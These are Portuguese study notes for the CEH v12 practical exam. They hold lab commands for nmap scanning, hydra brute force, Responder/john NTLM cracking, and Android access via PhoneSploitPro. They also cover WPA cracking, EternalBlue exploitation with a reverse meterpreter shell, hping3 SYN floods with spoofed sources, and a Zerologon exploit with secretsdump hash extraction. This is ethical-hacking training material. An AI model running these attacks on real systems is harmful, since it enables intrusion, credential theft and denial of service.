Questões do Ilabguide / bookshelf
Atividades passadas pelo instrutor e Anotações Importantes para prova.

links 

https://dontpad.com/cehv12noturno
https://github.com/hunterxxx/CEH-v12-Practical

****************

nmap -script vuln -Pn <machine_ip>
nmap -sV -Pn <>
nmap -sV -O -Pn <>
locate *.nse | grep smb-
nmap -sV ipmaquina --=smb-vuln*
**** obs ****
**************
Quando se usa o msvenom user tambem o nc -nlvp 
***************

## 01 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/1842

“Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords from wordlists” The output of this prompt results in the following command:
hydra -L/usr/share/wordlists/ftp-usernames.txt -p /usr/share/wordlists/ftp-passwords.txt ftp://10.10.1.11

nmap -sV -p 21 192.168.10.0/24 --=ftp-anon.nse / use o -sC ele mostra se tem ftp anonymous 


## 02 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4363
moviescoope:

GET da aplicacao moviescope.com pegando data de niver do usuario john
view profile:



## 03 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4499
The Login page appears; log in into the website using the retrieved credentials john/qwerty. 


## 04 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4570
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4578
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4580
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4581

MQTT Obs: Como encontrar o pacote, tamanho da mensagem MQTT é flag.  


Port 1883 is the default MQTT port; 1883 is defined by IANA as MQTT over TCP.
usar wireshark:

Type mqtt under the filter field and press Enter. To display only the MQTT protocol packets.
. Select any Publish Message packet from the Packet List pane. In the Packet Details pane at the middle of the window, expand the Transmission Control Protocol, MQ Telemetry Transport Protocol, and Header Flags nodes.
50. Under the MQ Telemetry Transport Protocol nodes, you can observe details such as Msg Len, Topic Length, Topic, and Message.
51. Publish Message can be used to obtain the message sent by the MQTT client to the broker.


## 05 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/641
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/644
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/651
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/654
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/657
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/668 ***
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/675 *** batman <kkkkkkkkkk>

NTLM: pwdump7 / Responder
Responder -I eth0
cd /usr/share/responder/logs
copiar toda hash ate nome do usuario.
vi hash.txt
john hash.txt ----wordlist=
john –-rules --wordlist=</path_to/output_wordlist.txt> format=NT /path/to/ntlm_hashes.txt 
-- show pra ver..


## 06 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/539
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/540
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/541

locate *.NSE | grepe SMB-
nmap -sV <targ> --script=smb-vuln
nmap -p 139 –-script smb-protocols <Target IP>


## 07 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/2661
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4538
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4539
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4544

nmap -sV -p 5555 <targ> --open
nmap -sn -PE 10.10.10.0/24

cd PhoneSploitpro
python3 PhoneSploitpro.py

1: Connect a Device <targ>
14: Acess Device Shell 

pwd
sdcard
ls
/sdcard/Download/images.jpeg
 Type exit and press Enter
8: Download File/Folder from Device

## 09 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4526
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4531   ****
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4532


 aireplay-ng -0 11 -a 22:7F:AC:6D:E6:8B -c EE:AB:46:A7:CF:18 wlx00e02d886189 and press Enter.
 aircrack-ng -a2 22:7F:AC:6D:E6:8B -w password.txt 

 aircrack-ng -w dicionario.txt pacotescapturados.pcap



## 10 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/3996
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4096
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4150
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4154

https://tryhackme.com/room/blue

ms17-010 - eternal blue  SMB(Server Message Block) 
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
nmap -script vuln -Pn <machine_ip>

msfconsole
search ms17-010 
use exploit/windows/smb/ms17_010_eternalblue or choose number
options
set rhosts <10.10.10.7 targ> 
set payload windows/x64/meterpreter/reverse_tcp
exploit
****** tente primeiro isso ****
*********************************
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lport 4321
exploit
meterpreter> shell
cd c:\
attrib
type flag.txt

**********************************
search shell_to_meterpreter
use 0
show options
set session 1
show sessions
sessions -i 2
getsystem
getuid
ps
migrate -P 2740

## 11 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4640
https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4643


veracrypt 
select file 
--mount secret
password qwerty@123

## 12 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/907
https://www.openstego.com/index-es.html

openstego
Extract Data
Input Stego File < imagem que possa esta encryptada >
Output Folder For Messager File < mensagem extraida caso tenha >
Password ? exemplo Batman, qwerty@123, imagination 

## 13 flood

VIA HPING
hping3 –S ipvitima –a ipdohacker –p 22 --flood

t50 ipALVO --flood -S --turbo --dport 80 

a) wireshark

b) dos em cima do 10.10.10.10 spoofando como se fosse o 10.10.10.19

hping3 -S 10.10.10.10 -a 10.10.10.19 -p 22 flood

c) ver no wireshark o resultado

OUTRO

a) deixar o windows 10 logado e mostrando o taskmanager.exe pra ver o consumo de cpu

b) ataque alterando o tamanho do pacote

hping3 -d 65538 -S -p 21 --flood 10.10.10.10

c) olhar a cpu do windows10, vai estar em 100%

OUTRO

se quiser UDP (-2)
hping3 -2 -p 139 --flood <Target IP Address>

## zero logo porta 135 CVE-2020-1472

Falta ver smb://
sqlmap
whatweb
Nikto
Usando o zerologon pra cima do AD
python3 [cve-2020-1472-exploit.py](http://cve-2020-1472-exploit.py/) SERVER2016 10.10.10.16

extraindo os hashes utilizando o impacket do kali
[secretsdump.py](http://secretsdump.py/) -just-dc CEH/SERVER2016\$@10.10.10.16







